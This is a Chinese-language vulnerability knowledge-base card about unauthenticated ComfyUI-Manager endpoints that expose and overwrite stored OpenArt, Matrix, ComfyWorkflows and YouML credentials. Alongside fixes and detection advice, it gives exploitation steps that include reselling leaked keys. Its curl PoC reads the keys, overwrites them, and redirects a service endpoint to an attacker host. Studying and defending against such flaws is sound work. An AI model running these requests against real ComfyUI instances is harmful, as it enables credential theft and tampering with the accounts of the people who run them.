---
id: web-python-comfyui-manager-unauth-thirdparty-credential-endpoints
title: ComfyUI-Manager /manager/get_openart_auth 等接口未授权读写第三方凭据：明文返回 OpenArt/Matrix/YouML 密钥
type: scenario
domain: web
path: web/python
technique: comfyui-manager-unauth-credential-api
tags:
- python
- comfyui
- comfyui-manager
- aiohttp
- unauthorized
- credential-leak
- api-security
- secret
- third-party
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V174
  verified_at: '2026-11-06T11:46:34+08:00'
  notes: 已对照原文与1张截图核对：图01 访问 /manager/get_openart_auth 返回 {"openart_key":"..."}（值打码）与卡片 PoC 一致；get_matrix_auth/get_comfyworkflows_auth/youml/settings 与两个 POST 写入接口为原文代码段结论，截图未验证写入。未验证点：未对真实 ComfyUI-Manager 实例复跑；原文未标注受影响版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/python/web-python-comfyui-manager-unauth-thirdparty-credential-endpoints/
draft: false
kb_aliases:
- ComfyUI-Manager 未授权凭据访问
- /manager/get_openart_auth
- openart_key 泄露
- matrix_auth 泄露
- comfyworkflows_sharekey 泄露
- YouML settings 未授权
- ComfyUI 第三方密钥泄露
---

## 一句话结论

ComfyUI-Manager 把 `/manager/get_openart_auth`、`/manager/get_matrix_auth`、`/manager/youml/settings`、`/manager/get_comfyworkflows_auth` 等凭据读写接口直接注册在 ComfyUI 的 aiohttp 路由上，没有登录态、Token、来源 IP 或管理员权限校验；任何能访问 ComfyUI 端口的人都能读取 `.openart_key`、Matrix、ComfyWorkflows 等第三方凭据，或通过对应的 POST 接口覆盖配置。

## 原理

- ComfyUI-Manager 将第三方集成的凭据以明文文件保存在 `core.manager_files_path` 下，例如 `.openart_key`、`matrix_auth`、`comfyworkflows_sharekey`、`.youml`。
- 凭据接口直接注册在 `PromptServer.instance.routes` 上：GET 处理器调用 `get_openart_auth()`/`get_matrix_auth()`/`get_youml_settings()`/`get_comfyworkflows_auth()` 读取文件，然后 `web.json_response(...)` 原样返回；代码中没有会话、Token、来源 IP 或管理员角色判断。
- 写入接口同样没有鉴权：`POST /manager/set_openart_auth` 读取 JSON 的 `openart_key` 并直接写入 `.openart_key`；`POST /manager/youml/settings` 把任意 JSON 写入 YouML 配置。攻击者可以覆盖密钥、把第三方请求指向自己的服务，或破坏配置导致业务异常。
- 根因是把 ComfyUI-Manager 的管理端点当成“本地可信”接口，但 ComfyUI 经常被部署在公网、反向代理后或多租户环境中；管理面与用户面没有分离，管理端点也没有统一鉴权中间件。
- 泄露的凭据可直接用于第三方 API：OpenArt key 可消耗额度/滥用资源；Matrix/ComfyWorkflows 凭据可用于账号访问；YouML 配置篡改可能引入错误路由或恶意参数，影响业务稳定性。若后续版本把更多第三方凭据接入同类接口，攻击面会继续扩大。

## 触发条件

- 目标运行 ComfyUI 并安装 ComfyUI-Manager，HTTP 端口（常见 8188）可从攻击者网络访问。
- 用户已配置至少一个第三方集成（OpenArt/Matrix/YouML/ComfyWorkflows），对应凭据文件存在；未配置时 GET 返回 404。
- 前置反向代理、WAF 或网络策略没有对 `/manager/*` 做认证/IP 白名单。
- 写入接口额外要求目标进程对 `manager_files_path` 有写权限（通常成立）。

## 利用步骤

1. 访问 `GET /manager/get_openart_auth`；若返回 200 且 JSON 含 `openart_key`，即拿到 OpenArt 凭据。
2. 依次探测 `GET /manager/get_matrix_auth`、`GET /manager/youml/settings`、`GET /manager/get_comfyworkflows_auth`，收集 Matrix/YouML/ComfyWorkflows 配置与凭据。
3. 用泄露的 key 调用对应第三方 API（查询账户、消耗额度、访问工作流/资源），或在黑市转卖。
4. 需要篡改时，向 `POST /manager/set_openart_auth` 发送 `{"openart_key":"<attacker-key>"}`，或向 `POST /manager/youml/settings` 发送任意 JSON；随后 GET 确认写入成功。
5. 若目标同时存在 ComfyUI-Manager 的配置/插件安装类未授权接口，可继续组合到 RCE（见关联卡片）。

## PoC

```bash
# 读取已保存的 OpenArt key
curl -s http://target:8188/manager/get_openart_auth
# {"openart_key":"<leaked-key>"}

# 读取 Matrix / ComfyWorkflows / YouML 配置
curl -s http://target:8188/manager/get_matrix_auth
curl -s http://target:8188/manager/get_comfyworkflows_auth
curl -s http://target:8188/manager/youml/settings

# 未授权覆盖 OpenArt key
curl -s -X POST http://target:8188/manager/set_openart_auth \
  -H 'Content-Type: application/json' \
  -d '{"openart_key":"attacker-controlled-key"}'

# 未授权覆盖 YouML 配置
curl -s -X POST http://target:8188/manager/youml/settings \
  -H 'Content-Type: application/json' \
  -d '{"endpoint":"http://attacker.example/","enabled":true}'
```

```text
# 预期：GET 返回 200 与明文凭据 JSON；POST 返回 200，再次 GET 可看到被覆盖的值。
# 原文截图仅验证 /manager/get_openart_auth 返回 {"openart_key": "..."}。
```

## 变体与关联

- 变体：同类 `/manager/*` 管理端点（配置读写、模型/节点安装、reboot）往往共用同一套无鉴权路由，可横向枚举。
- 变体：通过反向代理路径规范化/大小写/分号差异绕过仅针对部分路径的鉴权规则。
- 变体：拿到 OpenArt/Matrix 凭据后，若第三方服务支持回调/Webhook，可进一步在其侧植入持久化。
- 关联：[[web-python-comfyui-manager-weak-config-git-clone-reboot-rce]]（security_level=weak 放行高权限接口到 RCE）、[[web-python-comfyui-manager-cve-2026-22777-configparser-crlf-git-exe-rce]]（配置注入 RCE）、[[web-python-deserialization-comfyui-loadtrainingdataset-torch-load-pickle-rce]]（ComfyUI 反序列化 RCE）。
- 边界：若 `/manager/*` 前有强制认证、仅回环监听或 IP 白名单，本场景不成立；未配置第三方集成时接口返回 404，但写入接口仍可能可匿名调用。

## 检测与防御

- 修复：为 `/manager/*` 统一加认证中间件（服务端会话/Token），默认拒绝匿名访问；凭据读写仅管理员可用，普通用户不可见。
- 修复：写入接口增加 CSRF 防护、输入校验与审计日志（操作者、时间、来源 IP、变更摘要）；不要把凭据以明文落盘，改用系统密钥链/加密存储并限制文件权限。
- 加固：ComfyUI 只监听 `127.0.0.1`，远程访问走带认证的反向代理；网络层限制 8188 入站；对已泄露的 OpenArt/Matrix/ComfyWorkflows key 立即轮换。
- 检测：访问日志中出现 `GET /manager/get_openart_auth`、`get_matrix_auth`、`get_comfyworkflows_auth`、`youml/settings` 且来源非管理网段；`POST /manager/set_openart_auth`、`youml/settings` 的匿名写入；凭据文件被异常修改。
